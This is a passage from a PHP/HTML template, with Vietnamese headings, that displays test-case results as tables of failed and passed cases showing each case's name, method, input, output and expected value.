                    <td><small><?php echo htmlspecialchars($r['expected']); ?></small></td>
                    <td><span class="fail">FAIL</span></td>
                </tr>
            <?php endforeach; ?>
        <?php endif; ?>
    </table>

    <h2 style="color: #28a745;" class="tab-title">II. TRẠNG THÁI THÀNH CÔNG (PASS - <?php echo count($passed_results); ?> cases)</h2>
    <table>
        <tr>
            <th width="20%">Tên Test & Method</th>
            <th width="30%">Dữ liệu kiểm thử (Input)</th>
            <th width="30%">Kết quả đầu ra (Output)</th>
            <th width="12%">Kỳ vọng</th>
            <th width="8%">Trạng thái</th>
        </tr>
        <?php if (count($passed_results) == 0): ?>
            <tr>
                <td colspan="5" style="text-align:center; padding: 20px;">Không có testcase nào thành công.</td>
            </tr>
        <?php else: ?>
            <?php foreach ($passed_results as $r): ?>
                <tr>
                    <td><strong><?php echo htmlspecialchars($r['name']); ?></strong><br><small><?php echo htmlspecialchars($r['method']); ?></small></td>
                    <td>
                        <pre><?php echo htmlspecialchars(var_export($r['input'], true)); ?></pre>
                    </td>
                    <td>
                        <pre><?php echo htmlspecialchars(var_export($r['output'], true)); ?></pre>
                    </td>
                    <td><small><?php echo htmlspecialchars($r['expected']); ?></small></td>
                    <td><span class="pass">PASS</span></td>
                </tr>
            <?php endforeach; ?>
        <?php endif; ?>
    </table>
</body>

</html>